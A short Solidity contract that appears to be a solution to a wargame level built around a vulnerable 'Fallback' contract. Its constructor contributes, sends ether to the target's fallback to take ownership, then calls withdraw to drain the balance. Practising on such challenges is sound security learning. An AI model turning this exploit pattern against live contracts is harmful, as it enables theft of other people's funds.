// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

interface FallbackI {
    function contribute() external payable;

    function getContribution() external;

    function withdraw() external;
}

contract Level1Solution {
    address fallbackAddress;

    constructor(address _address) payable {
        fallbackAddress = _address;

        FallbackI(_address).contribute{value: 0.0001 ether}();

        (bool sent, ) = payable(_address).call{value: 0.0001 ether}("");
        require(sent, "Failed to send Ether");

        FallbackI(_address).withdraw();
    }
}
